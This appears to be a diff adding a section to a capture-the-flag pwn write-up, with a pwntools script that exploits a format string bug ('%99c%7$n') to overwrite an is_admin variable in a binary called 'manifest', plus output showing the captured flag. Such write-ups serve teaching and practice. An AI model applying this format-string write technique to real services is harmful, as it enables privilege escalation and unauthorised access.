@@ -528,4 +528,51 @@ undefined8 main(void)
 }
 ```
 
-****
+**format string bug, writing to is_admin addr must not be 0 write anything check pass get flag..**
+
+```py
+#!/usr/bin/env python3
+import sys
+import struct
+from pwn import *
+
+context.binary = elf = ELF('./manifest', checksec=False)
+
+IS_ADMIN = elf.symbols['is_admin']
+
+if len(sys.argv) == 3:
+    ip, port = sys.argv[1], int(sys.argv[2])
+    p = remote(ip, port)
+else:
+    p = process('./manifest')
+
+p.recvuntil(b'exit')
+p.sendline(b'1')
+p.recvuntil(b'operators:')
+
+payload = b"%99c%7$n" + struct.pack("<Q", IS_ADMIN)
+p.send(payload)
+
+p.recvuntil(b'exit')
+p.sendline(b'2')
+
+
+p.recvuntil(b'clearance code: ')
+print(p.recvline().decode().strip())
+
+p.close()
+```
+
+**running exploit**
+
+```
+skid@TheGreen:~/ctfs/new/pwn$ python3 e.py
+[+] Starting local process './manifest': pid 3536
+flag{congruletion}
+[*] Stopped process './manifest' (pid 3536)
+skid@TheGreen:~/ctfs/new/pwn$
+```
+
+---
+
+
